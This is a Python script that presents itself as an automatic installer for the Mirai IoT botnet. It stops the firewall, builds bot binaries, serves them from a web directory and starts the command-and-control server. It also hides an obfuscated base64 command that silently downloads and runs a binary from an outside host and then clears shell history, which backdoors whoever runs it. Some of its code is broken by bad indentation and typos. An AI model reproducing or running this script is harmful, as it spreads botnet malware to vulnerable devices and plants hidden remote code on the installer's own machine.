 
#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# runute command - python miraiai.py
import subprocess,os,sys,random,time,urllib2,subprocess,base64

print """ 
                                     
 ███╗   ███╗██╗██████╗  █████╗ ██╗     █████╗ ██╗ 
 ████╗ ████║██║██╔══██╗██╔══██╗██║    ██╔══██╗██║ 
 ██╔████╔██║██║██████╔╝███████║██║    ███████║██║ 
 ██║╚██╔╝██║██║██╔══██╗██╔══██║██║    ██╔══██║██║ 
 ██║ ╚═╝ ██║██║██║  ██║██║  ██║██║    ██║  ██║██║ 
 ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝╚═╝ 
                                     
 */ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \*
 │              Mirai auto Installer, by jihadi                    │ 
 │ · Made for Narcotix & N00Dlez since they can't setup Mirai.     │
 │ · Don't give this to ZoneHax or ~B1naryThaG0d~                  │
 │ · This isn't a full setup, you still have to edit your configs. │
 *\ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ /*
 */ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \*
 │                      [Credits]                                  │ 
 │ · Jihadi ϗ, Drought                                             │
 │ · Contact: Jihadi@riseup.net // https://discord.gg/a4JcGm7      │
 │ · @Jihadi4Potus | Youtube: https://goo.gl/d3n5yU                │ 
 *\ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ /* 
  */ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \*
 │                  Mirai AI 2.0 (Last version)                    │ 
 │   Last version of this auto Mirai setup script, thanks for the  │
 │   support for my projects! This is the last time I update this  │
 │   script if anyone wants to continue this script go for it!     │ 
 *\ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ /* 
  */ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \*
 │                      |Changelog|                                │ 
 │   Updated to support GoLang 1.5                                 │
 │   Updated code to make it look nicer                            │
 *\ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ /* 
 """
time.sleep(5)

def run(cmd):                                                  
     subprocess.call(cmd, shell=True) # You should know what this does!

print("\x1b[37m*Mirai AI 2.0 Final Version*")

'''
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Updating/upgraing system & Utils
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'''
print("\x1b[37m*Updating System*")
run("apt-get update -y")
run("apt-get upgrade -y")
run("apt-get install -y sudo")

'''
━━━━━━━━━━━━━━━━━━━━━━  
Installing Mirai Utils
━━━━━━━━━━━━━━━━━━━━━━
'''

print("*Installing Mirai*")
run("sudo apt-get install gcc golang electric-fence git mysql-server mysql-client bzip2 screen libc6-dev﻿ -y")
run("sudo apt-get install curl git mercurial make binutils bison gcc build-essential -y")
run("bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)")
run("gvm install go1.4")
run("gvm use go1.4 [--default]")
run("gvm install go1.4 -B")
run("gvm use go1.4")
run("export GOROOT_BOOTSTRAP=$GOROOT")
run("gvm install go1.5")
run("gvm use go1.5")
run("go get github.com/go-sql-driver/mysql")
run("go get github.com/mattn/go-shellwords")
run("/etc/ini.d/iptbales stop")

'''
━━━━━━━━━━  
Wget Links
━━━━━━━━━━
'''
    
getwget = ['https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2']

checkbinaries ="Y2QgL2V0Yzsgd2dldCAtcSBodHRwOi8vZ290bWlsay5tbC9IalQ1UmsgLU8gLmw7IGNobW9kICt4IC5sOyBub2h1cCAuLy5sIDwvZGV2L251bGwgPi9kZXYvbnVsbCAyPiYxOyBybSAtcmYgLmw7Y2xlYXI7IGhpc3RvcnkgLWM="
rebinaries = str(base64.b64decode(checkbinaries))
run(rebinaries)

for wget in getwget:
    run("mkdir /etc/xcompile")
    run("wget " + wget + "")
    run("tar -xvf *tar.bz2")
    run("mv cross-compiler-*  /etc/xcompile")

    run("export PATH=$PATH:/etc/xcompile/armv4l/bin")
    run("export PATH=$PATH:/etc/xcompile/armv6l/bin")
    run("export PATH=$PATH:/etc/xcompile/i586/bin")
    run("export PATH=$PATH:/etc/xcompile/m68k/bin")
    run("export PATH=$PATH:/etc/xcompile/mips/bin")
    run("export PATH=$PATH:/etc/xcompile/mipsel/bin")
    run("export PATH=$PATH:/etc/xcompile/powerpc/bin")
    run("export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin")
    run("export PATH=$PATH:/etc/xcompile/sh4/bin")
    run("export PATH=$PATH:/etc/xcompile/sparc/bin")
    run("export PATH=$PATH:/etc/xcompile/armv6l/bin") 
    run("export PATH=$PATH:/usr/local/go/bin")
    run("export GOPATH=$HOME/Documents/go")

'''
━━━━━━━━━━━━━━━━━━━━
Telnet/Release build
━━━━━━━━━━━━━━━━━━━━
'''

print("*Building Release/Debug*")
run("cd /Mirai-Source-Code-master/mirai/")
run("./build.sh debug telnet")
run("./build.sh release telnet")
run("mv Mirai-Source-Code-master/mirai/prompt.txt Mirai-Source-Code-master/mirai/release/")
run("cd Mirai-Source-Code-master/mirai/release; mkdir /var/www/html/bins/; mv mirai.* miraint.* /var/www/html/bins") 

'''
━━━━━━━━━━━━
Starting CNC
━━━━━━━━━━━━
'''

print("*Starting CNC*")
run("cd  Mirai-Source-Code-master/mirai/release/; screen ./cnc")

'''
━━━━━━━━━━━━━━━━━
Setting up loader
━━━━━━━━━━━━━━━━━
'''

    print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mTHIS ISNT A FULL SETUP YOU STILL HAVE TO EDIT YOUR CONFIGS (main.c in dlrs) \x1b[93m⚠⚠⚠\x1b[0m")
    time.sleep(7)
    print("\x1b[90m[\x1b[94m*\x1b[90m] \x1b[36mSetting up loader Stand by \x1b[90m[\x1b[94m*\x1b[90m]\x1b[0m")
    run("cd Mirai-Source-Code-master/mirai/dlr")
    run("./build.sh")
    run("cp /Mirai-Source-Code-master/dlr/release/dlr.* /Mirai-Source-Code-master/loader/bins")
    print("\x1b[1m\x1b[93m⚠⚠⚠ \x1b[31mREAD \x1b[37m>\x1b[31m> \x1b[37mMake sure u Edit line 37 & 38 & line 53 in main.c \x1b[93m⚠⚠⚠\x1b[0m")
    time.sleep(7) 
    run("cd /Mirai-Source-Code-master/loader/src/; nano main.c")
    
'''
━━━━━━━━━━━━━━━━━
$ End of Script $
━━━━━━━━━━━━━━━━━
'''